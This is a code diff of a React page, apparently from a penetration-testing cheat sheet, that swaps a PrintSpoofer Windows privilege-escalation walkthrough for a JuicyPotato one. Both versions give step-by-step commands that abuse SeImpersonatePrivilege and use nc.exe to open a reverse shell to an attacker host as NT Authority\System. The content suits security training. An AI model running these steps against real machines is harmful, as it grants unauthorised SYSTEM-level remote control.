@@ -8,13 +8,12 @@ import {
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const SeImpersonatePrivilege = ({ title }: IProps) => {
+const SeImpersonateJuicyPotato = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -34,6 +33,12 @@ const SeImpersonatePrivilege = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
+            <Typography variant="h6">Requirements</Typography>
+            <Typography>
+              JuicyPotato doesn't work on Windows Server 2019 and Windows 10
+              build 1809 onwards.
+            </Typography>
+            <Box sx={{ m: 4 }} />
             <Typography variant="h6">Description</Typography>
             <Typography>
               The SeImpersonatePrivilege policy setting determines which
@@ -43,69 +48,46 @@ const SeImpersonatePrivilege = ({ title }: IProps) => {
             </Typography>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
-            <Typography>
-              Chech privileges for{" "}
-              <Typography className="highlight" display="inline">
-                SeImpersonatePrivilege
-              </Typography>
-            </Typography>
-            <Image
-              src="/seimpersonateprivilege.png"
-              height={266}
-              width={672}
-              priority={true}
-            />
+            <Typography>Download JuicyPotato</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {
+                "wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+              }
+            </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>Download PrintSpoofer.</Typography>
-            <Box sx={{ m: 2 }} />
-            <Typography>32-bit</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {
-                "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe"
-              }
-            </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <Typography>64-bit</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {
-                "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
-              }
-            </SyntaxHighlighter>
-            <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 3</Typography>
             <Typography>Download Netcat</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {"wget https://github.com/int0x33/nc.exe/raw/master/nc.exe"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 4</Typography>
+            <Typography variant="h6">Step 3</Typography>
             <Typography>
-              Transfer PrintSpoofer and Netcat to victim machine.
+              Transfer JuicyPotato and Netcat to the Victim machine.
             </Typography>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 5</Typography>
+            <Typography variant="h6">Step 4</Typography>
             <Typography>Start a Netcat listener on Attacker machine</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {"nc -lvnp 4444"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 6</Typography>
+            <Typography variant="h6">Step 5</Typography>
             <Typography>
-              Execute PrintSpoofer. `-c "c:\tools\nc.exe &lt;ATTACKER_IP&gt;
-              4444 -e cmd"` is to execute a command. We are using `nc.exe` to
-              spawn a reverse shell.
+              Execute JuicyPotato. `-l 53375` is the COM listening port. `-p
+              c:\windows\system32\cmd.exe` is the program to launch. `-a "/c
+              c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"`. `-t *` is the
+              createprocess call.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                'c:\\tools\\PrintSpoofer.exe -c "c:\\tools\\nc.exe {ATTACKER_IP} 4444 -e cmd"'
+                'c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\tools\\nc.exe {ATTACKER_IP} 4444 -e cmd.exe" -t *'
               }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 7</Typography>
+            <Typography variant="h6">Step 6</Typography>
             <Typography>
-              After executing PrintSpoofer, you should have a reverse shell on
-              your Attacker machine as Nt Authority\System.
+              After execution, you should have a shell as NT Authority\System
             </Typography>
           </Typography>
         </AccordionDetails>
@@ -114,4 +96,4 @@ const SeImpersonatePrivilege = ({ title }: IProps) => {
   );
 };
 
-export default SeImpersonatePrivilege;
+export default SeImpersonateJuicyPotato;
